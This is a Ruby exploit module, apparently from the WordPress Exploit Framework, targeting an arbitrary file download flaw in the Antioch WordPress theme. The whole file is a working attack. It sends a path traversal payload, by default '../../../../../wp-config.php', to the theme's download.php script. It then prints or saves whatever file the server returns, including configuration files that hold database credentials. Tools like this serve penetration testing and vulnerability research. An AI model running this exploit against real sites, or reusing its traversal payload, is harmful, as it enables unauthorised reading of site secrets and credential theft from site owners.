class Wpxf::Auxiliary::AntiochArbitraryFileDownload < Wpxf::Module
  include Wpxf

  def initialize
    super

    update_info(
      name: 'Antioch Theme Arbitrary File Download',
      desc: 'This module exploits a vulnerability in the Antioch theme '\
            'which allows you to download any arbitrary file accessible '\
            'by the user the web server is running as.',
      author: [
        'Ashiyane Digital Security Team',  # Disclosure
        'Rob Carr <rob[at]rastating.com>'  # WPXF module
      ],
      references: [
        ['WPVDB', '8406']
      ],
      date: 'Sep 08 2014'
    )

    register_options([
      Wpxf::Options::StringOption.new(
        name: 'remote_file',
        desc: 'The path to the remote file (relative to /wp-content/themes/antioch/lib/scripts/)',
        required: true,
        default: '../../../../../wp-config.php'
      ),
      Wpxf::Options::StringOption.new(
        name: 'export_path',
        desc: 'The file to save the file to',
        required: false
      )
    ])
  end

  def check
    check_theme_version_from_style('antioch')
  end

  def remote_file
    normalized_option_value('remote_file')
  end

  def export_path
    normalized_option_value('export_path')
  end

  def downloader_url
    normalize_uri(wordpress_url_themes, 'antioch', 'lib', 'scripts', 'download.php')
  end

  def request_file
    if export_path.nil?
      emit_info 'Requesting file...'
      return execute_get_request(
        url: downloader_url,
        params: { 'file' => remote_file }
      )
    else
      emit_info 'Downloading file...'
      return download_file(
        url: downloader_url,
        method: :get,
        params: { 'file' => remote_file },
        local_filename: export_path
      )
    end
  end

  def run
    return false unless super

    res = request_file

    if res.nil? || res.timed_out?
      emit_error 'Request timed out, try increasing the http_client_timeout'
      return false
    end

    if res.code != 200
      emit_error "Server responded with code #{res.code}"
      return false
    end

    if export_path.nil?
      emit_success "Result: \n#{res.body}"
    else
      emit_success "Downlaoded file to #{export_path}"
    end

    true
  end
end
